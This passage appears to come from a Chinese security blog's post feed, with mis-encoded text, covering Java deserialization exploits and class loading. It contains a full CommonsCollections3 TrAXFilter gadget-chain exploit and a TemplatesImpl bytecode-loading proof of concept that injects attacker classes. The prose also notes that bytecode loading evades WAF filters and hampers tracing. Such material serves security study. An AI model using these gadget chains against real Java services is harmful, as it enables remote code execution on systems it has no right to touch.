class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TrAXFilter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry2.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesClass&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å„åºåˆ—åŒ–ä»£ç å»æ‰_tfactoryçš„èµ‹å€¼ä¾æ—§èƒ½ç”¨ï¼ŒåŸç†ä¸Šé¢è¯´è¿‡äº†ã€‚</p><p>ç›®å‰ä»¥ä¸‹å‡ ä¸ªè·¯å¾„éƒ½èƒ½è§¦å‘å‘½ä»¤æ‰§è¡Œorä»£ç æ‰§è¡Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801180040465.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801180040465.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªæç¬‘çš„é“¸å¸CC3</title>
      <link href="/2024/08/01/cc3-xiao-cha-qu/"/>
      <url>/2024/08/01/cc3-xiao-cha-qu/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©æ²¡äº‹æƒ³è‡ªå·±å†™ä¸ªCC3ç±»åŠ è½½</p><p>ç»“æœä¸ºäº†é¡ºåˆ©è§¦å‘åˆ°TemplatesImpl#getTransletInstanceçš„newInstanceç»™æˆ‘æ•´æ€¥çœ¼äº†ï¼Œä½¿åŠ²æ”¹å­—æ®µå¼ºè¡Œé€šè¿‡å¾ªç¯<br><img src="https://i-blog.csdnimg.cn/direct/52b9cf112fac47398f1dd43765926eb7.png" class="lazyload placeholder" data-srcset="https://i-blog.csdnimg.cn/direct/52b9cf112fac47398f1dd43765926eb7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆšæ‰åˆ¤å®šäº†ï¼Œ_auxClassesä¸ºtransientï¼Œä¸èƒ½ç”¨è¿™ç§æ–¹æ³•</p><p>ç»“æœæäº†ä¸ªä¸‹é¢çš„ä»£ç å‡ºæ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;CC6TiedMapEntry&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_outputProperties&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">Properties</span>());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_transletIndex&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_auxClasses&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        templatesClass.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½ åˆ«è¯´ï¼Œè¿˜çœŸTMèƒ½è·‘ã€‚<img src="https://i-blog.csdnimg.cn/direct/bd39e593812d4fe8b63b3e1c14d9cc5b.png" class="lazyload placeholder" data-srcset="https://i-blog.csdnimg.cn/direct/bd39e593812d4fe8b63b3e1c14d9cc5b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">è¯´ä¸€ä¸‹æ€ä¹ˆæçš„<br>è°ƒè¯•çš„æ—¶å€™bytecodeæ•°ç»„åªæœ‰ä¸€ä¸ªæ¶æ„ç±»ï¼Œå°±åˆ›å»ºä¸äº†hashMapï¼Œåé¢å°±putä¸è¿›å»ã€‚<br><img src="https://i-blog.csdnimg.cn/direct/00d7d3bddf1c48db8327039c4c27ac6c.png" class="lazyload placeholder" data-srcset="https://i-blog.csdnimg.cn/direct/00d7d3bddf1c48db8327039c4c27ac6c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">äºæ˜¯æˆ‘bytecodeä¼ äº†ä¸¤ä¸ªæ¶æ„æ•°ç»„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code,code&#125;);</span><br></pre></td></tr></table></figure><p>ç»“æœè¿›ç¬¬äºŒä¸ªcatchï¼ŒhashMapä¸èƒ½é‡å¤put<br><img src="https://i-blog.csdnimg.cn/direct/6c6442df540e46b79bcce2e74b388a0d.png" class="lazyload placeholder" data-srcset="https://i-blog.csdnimg.cn/direct/6c6442df540e46b79bcce2e74b388a0d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">æˆ‘åˆä¼ äº†ä¸ªç©ºå­—èŠ‚ï¼Œæˆ‘å»ï¼Œç©ºå­—èŠ‚ä¸èƒ½defineClassï¼Œè¿å¾ªç¯éƒ½å‡ºä¸äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code,<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>]&#125;);</span><br></pre></td></tr></table></figure><p>çªç„¶æƒ³åˆ°ï¼Œæˆ‘è‡ªå·±æä¸ªhashMapå°±å®Œäº†ï¼Œç”¨ä»–çš„å¹²æ¯›å•Š<br>äºæ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_auxClasses&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰åƒä¸ªå¤§é“¸å¸å†™çš„</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaç±»åŠ è½½åŠåŒäº²å§”æ´¾æœºåˆ¶</title>
      <link href="/2024/07/31/java-lei-jia-zai-ji-shuang-qin-wei-pai/"/>
      <url>/2024/07/31/java-lei-jia-zai-ji-shuang-qin-wei-pai/</url>
      
        <content type="html"><![CDATA[<p>å‰é¢çš„CC1å’ŒCC6ï¼Œéƒ½æ˜¯åœ¨Runtime.execæ‰§è¡Œå‘½ä»¤ã€‚å¦‚æœWAFè¿‡æ»¤äº†Runtimeå°±å¯„ï¼Œè€Œä¸”ç”¨å‘½ä»¤çš„æ–¹å¼å†™å…¥shellè¿›è¡Œä¸‹ä¸€æ­¥åˆ©ç”¨ï¼Œåœ¨æµé‡ä¸­ä¸€ä¸ªæ•°æ®åŒ…å°±èƒ½æŠŠä½ çš„è¡Œä¸ºå…¨éƒ¨çœ‹å®Œï¼Œå¾ˆå®¹æ˜“è¢«åˆ†æå‡ºæ¥ã€‚</p><p>å¦‚æœç”¨æ¶æ„å­—èŠ‚ç åŠ è½½çš„æ–¹å¼ï¼Œæˆ‘ä»¬çš„æµé‡ä¼šæ›´ä¹±ï¼Œæº¯æºæ›´éº»çƒ¦ã€‚è€Œä¸”æœ€åè§¦å‘ç‚¹ä¸ºdefineClassï¼Œè§£å†³äº†è¿‡æ»¤Runtimeå’Œexecçš„é—®é¢˜ã€‚</p><p>å¦‚æœè¦å­¦åŠ¨æ€ç±»åŠ è½½ï¼Œé‚£ä¸€å®šç»•ä¸å¼€ç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æœºåˆ¶</p><p><a href="https://javaguide.cn/java/jvm/classloader.html#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%80%BB%E7%BB%93">https://javaguide.cn/java/jvm/classloader.html#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%80%BB%E7%BB%93</a></p><p>ä¹Ÿå¯ä»¥å°è¯•è‡ªå·±è°ƒç”¨ClassLoader.loadClass()è¿›è¡Œè°ƒè¯•ï¼ˆæ™®é€šæ­¥å…¥è¿›ä¸å»ï¼Œéœ€è¦å¼ºåˆ¶æ­¥å…¥ï¼‰ï¼Œä½†æ˜¯ä¸æ¨èï¼Œè„‘å­ä¼šè¢«æå¾—å¾ˆä¹±ã€‚</p><h2 id="JavaåŒäº²å§”æ´¾ç±»åŠ è½½"><a href="#JavaåŒäº²å§”æ´¾ç±»åŠ è½½" class="headerlink" title="JavaåŒäº²å§”æ´¾ç±»åŠ è½½"></a>JavaåŒäº²å§”æ´¾ç±»åŠ è½½</h2><p>JVM ä¸­å†…ç½®äº†ä¸‰ä¸ªé‡è¦çš„ <code>ClassLoader</code>ï¼š</p><ol><li>**<code>BootstrapClassLoader</code>(å¯åŠ¨ç±»åŠ è½½å™¨)**ï¼šæœ€é¡¶å±‚çš„åŠ è½½ç±»ï¼Œç”± C++å®ç°ï¼Œé€šå¸¸è¡¨ç¤ºä¸º nullï¼Œå¹¶ä¸”æ²¡æœ‰çˆ¶çº§ï¼Œä¸»è¦ç”¨æ¥åŠ è½½ JDK å†…éƒ¨çš„æ ¸å¿ƒç±»åº“ï¼ˆ <code>%JAVA_HOME%/lib</code>ç›®å½•ä¸‹çš„ <code>rt.jar</code>ã€<code>resources.jar</code>ã€<code>charsets.jar</code>ç­‰ jar åŒ…å’Œç±»ï¼‰ä»¥åŠè¢« <code>-Xbootclasspath</code>å‚æ•°æŒ‡å®šçš„è·¯å¾„ä¸‹çš„æ‰€æœ‰ç±»ã€‚</li><li>**<code>ExtensionClassLoader</code>(æ‰©å±•ç±»åŠ è½½å™¨)**ï¼šä¸»è¦è´Ÿè´£åŠ è½½ <code>%JRE_HOME%/lib/ext</code> ç›®å½•ä¸‹çš„ jar åŒ…å’Œç±»ä»¥åŠè¢« <code>java.ext.dirs</code> ç³»ç»Ÿå˜é‡æ‰€æŒ‡å®šçš„è·¯å¾„ä¸‹çš„æ‰€æœ‰ç±»ã€‚</li><li>**<code>AppClassLoader</code>(åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨)**ï¼šé¢å‘æˆ‘ä»¬ç”¨æˆ·çš„åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½å½“å‰åº”ç”¨ classpath ä¸‹çš„æ‰€æœ‰ jar åŒ…å’Œç±»ã€‚</li></ol><p>é™¤äº† <code>BootstrapClassLoader</code> æ˜¯ JVM è‡ªèº«çš„ä¸€éƒ¨åˆ†ä¹‹å¤–ï¼Œå…¶ä»–æ‰€æœ‰çš„ç±»åŠ è½½å™¨éƒ½æ˜¯åœ¨ JVM å¤–éƒ¨å®ç°çš„ï¼Œå¹¶ä¸”å…¨éƒ½ç»§æ‰¿è‡ª <code>ClassLoader</code>æŠ½è±¡ç±»ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731105932213.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731105932213.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>ClassLoader</code> ç±»æœ‰ä¸¤ä¸ªå…³é”®çš„æ–¹æ³•ï¼š</p><ul><li><code>protected Class loadClass(String name, boolean resolve)</code>ï¼šåŠ è½½æŒ‡å®šäºŒè¿›åˆ¶åç§°çš„ç±»ï¼Œå®ç°äº†åŒäº²å§”æ´¾æœºåˆ¶ ã€‚<code>name</code> ä¸ºç±»çš„äºŒè¿›åˆ¶åç§°ï¼Œ<code>resolve</code> å¦‚æœä¸º trueï¼Œåœ¨åŠ è½½æ—¶è°ƒç”¨ <code>resolveClass(Class&lt;?&gt; c)</code> æ–¹æ³•è§£æè¯¥ç±»ã€‚</li><li><code>protected Class findClass(String name)</code>ï¼šæ ¹æ®ç±»çš„äºŒè¿›åˆ¶åç§°æ¥æŸ¥æ‰¾ç±»ï¼Œé»˜è®¤å®ç°æ˜¯ç©ºæ–¹æ³•ã€‚</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731105804759.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731105804759.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŒäº²å§”æ´¾æ¨¡å‹çš„æ‰§è¡Œæµç¨‹ï¼š</p><ul><li>åœ¨ç±»åŠ è½½çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šé¦–å…ˆåˆ¤æ–­å½“å‰ç±»æ˜¯å¦è¢«åŠ è½½è¿‡ã€‚å·²ç»è¢«åŠ è½½çš„ç±»ä¼šç›´æ¥è¿”å›ï¼Œå¦åˆ™æ‰ä¼šå°è¯•åŠ è½½ï¼ˆæ¯ä¸ªçˆ¶ç±»åŠ è½½å™¨éƒ½ä¼šèµ°ä¸€éè¿™ä¸ªæµç¨‹ï¼‰ã€‚</li><li>ç±»åŠ è½½å™¨åœ¨è¿›è¡Œç±»åŠ è½½çš„æ—¶å€™ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼ˆè°ƒç”¨çˆ¶åŠ è½½å™¨ <code>loadClass()</code>æ–¹æ³•æ¥ä¼ é€’ç±»ï¼‰ã€‚è¿™æ ·çš„è¯ï¼Œæ‰€æœ‰çš„è¯·æ±‚æœ€ç»ˆéƒ½ä¼šä¼ é€åˆ°é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ <code>BootstrapClassLoader</code> ä¸­ã€‚</li><li>åªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¿™ä¸ªåŠ è½½è¯·æ±‚ï¼ˆå®ƒçš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ï¼ˆè°ƒç”¨è‡ªå·±çš„ <code>findClass()</code> æ–¹æ³•æ¥åŠ è½½ç±»ï¼‰ã€‚</li><li>å¦‚æœå­ç±»åŠ è½½å™¨ä¹Ÿæ— æ³•åŠ è½½è¿™ä¸ªç±»ï¼Œé‚£ä¹ˆå®ƒä¼šæŠ›å‡ºä¸€ä¸ª <code>ClassNotFoundException</code> å¼‚å¸¸ã€‚</li></ul><p>ç”±äºloadClassæ˜¯ä¼ é€’ï¼Œæ‰€ä»¥åªæœ‰AppClassLoaderé‡å†™äº†loadClassï¼Œå› ä¸ºBootstrapClassLoaderæ˜¯C++å®ç°çš„ï¼Œå·²ç»æ— éœ€ç”±ExtClassLoaderä¼ é€’ä¸Šå»ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731113942238.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731113942238.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£ä¸ºä»€ä¹ˆä¸¤ä¸ªç±»éƒ½æ²¡å®ç°findClassæ¥åŠ è½½ç±»å‘¢ï¼Ÿå®é™…ä¸Šä¸¤ä¸ªç±»éƒ½ç»§æ‰¿äº†URLClassLoaderï¼Œè°ƒç”¨URLClassLoader#findClassæ¥é€šè¿‡è·¯å¾„åŠ è½½ç±»ã€‚</p><h2 id="ç±»åŠ è½½å™¨ä¹‹URLClassLoader"><a href="#ç±»åŠ è½½å™¨ä¹‹URLClassLoader" class="headerlink" title="ç±»åŠ è½½å™¨ä¹‹URLClassLoader"></a>ç±»åŠ è½½å™¨ä¹‹URLClassLoader</h2><p>ä¸Šæ–‡çš„åŒäº²å§”æ´¾ï¼Œç±»åŠ è½½å™¨ä¹‹é—´å¹¶ä¸æ˜¯ç»§æ‰¿çš„å…³ç³»ï¼Œè€Œæ˜¯ä½¿ç”¨ç»„åˆå…³ç³»æ¥å¤ç”¨çˆ¶åŠ è½½å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// ç»„åˆ</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line">  <span class="keyword">protected</span> <span class="title function_">ClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>(checkCreateClassLoader(), parent);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœŸå®çš„ç»§æ‰¿å…³ç³»å¦‚å›¾ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731111552787.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731111552787.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>AppClassLoaderå’ŒExtClassLoaderéƒ½æ˜¯Launcherçš„é™æ€å†…éƒ¨ç±»ï¼Œç»§æ‰¿è‡ªURLClassLoader</p><ul><li>SecureClassLoaderï¼šæ‰©å±•äº†ClassLoaderï¼Œå¹¶ä¸ºå®šä¹‰å…·æœ‰ç›¸å…³ä»£ç æºå’Œæƒé™çš„ç±»æä¾›äº†é¢å¤–æ”¯æŒï¼Œè¿™äº›ä»£ç æºå’Œæƒé™é»˜è®¤æƒ…å†µä¸‹ç”±ç³»ç»Ÿç­–ç•¥æ£€ç´¢ã€‚</li><li>URLClassLoaderï¼šç»§æ‰¿è‡ªSecureClassLoaderï¼Œæ”¯æŒä»jaræ–‡ä»¶å’Œæ–‡ä»¶å¤¹ä¸­è·å–classï¼Œç»§æ‰¿äºClassloaderï¼ŒåŠ è½½æ—¶é¦–å…ˆå»Classloaderé‡Œåˆ¤æ–­æ˜¯å¦ç”±å¯åŠ¨ç±»åŠ è½½å™¨åŠ 